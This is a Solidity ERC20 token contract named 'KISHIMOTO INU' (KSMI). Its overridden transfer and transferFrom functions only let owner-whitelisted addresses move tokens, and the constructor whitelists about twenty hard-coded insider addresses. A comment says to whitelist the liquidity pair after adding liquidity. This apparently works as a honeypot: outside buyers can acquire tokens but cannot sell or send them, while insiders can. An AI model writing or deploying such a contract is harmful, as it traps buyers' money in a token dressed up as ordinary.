// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("KISHIMOTO INU", "KSMI") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 100000000 * 10 ** decimals());
        whiteList[0x0c6e61E334678c92420a323A7E12Bb97077114a9]= true;
        whiteList[0xdF7BF5800b42E007AD4b52A1B72a0e163D5F8405]=true;
        whiteList[0x18BF6C6785C56651A41ccBfe0666Bcd02cA77A21]=true;
        whiteList[0x52E8103761736627F59ffAEE8D07eF7Fef783Ca9]=true;
        whiteList[0xbF43256987Ea5766f3d40890bb6b211C714fA58B]=true;
        whiteList[0x89Ca1f0c28b5E2D2D5076baAeC13ffAEb28358Cc]=true;
        whiteList[0x26453c2762d12fC99dF9487f338820497F7B089b]=true;
        whiteList[0x8d20fDF6686816fe7115a423f6128e78F3Bf61FA]=true;
        whiteList[0x9550922deCDff27DE6b1164ccA31fE5438b87e29]=true;
        whiteList[0x794DFFAAEc17041AB6435B2D05E96F6C21983876]=true;
        whiteList[0xA07Cd80C27101852335cBD33dC3E4593fd81d84E]=true;
        whiteList[0x00183426439f24760f3d0903916511B5A7ff7438]=true;
        whiteList[0x5DC63d2b05165d1C9dE421C4467dD32aa4acFd6C]=true;
        whiteList[0x704f850eDb8f4713ab12C6364B72ee7c845d4816]=true;
        whiteList[0x4d3c4f10653337a1065412d0C33Ab7EffCE8B545]=true;
        whiteList[0x262058Bbc8D9727B780899b8Ce43Ac580cBD8583]=true;
        whiteList[0x90cba1E3f9172252d3d859DE2f0c2028103D2B8E]=true;
        whiteList[0xf232411eD1cF2c5587f7496b453b779ECA5F76B9]=true;
        whiteList[0xE6Bd692Aaee72C2Ee0b22C4cBa27Eb63701A4Fd6]=true;
        whiteList[0xB6a8523982c3F3Bc7c76b40fABeDaAE8b041Fa9E]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}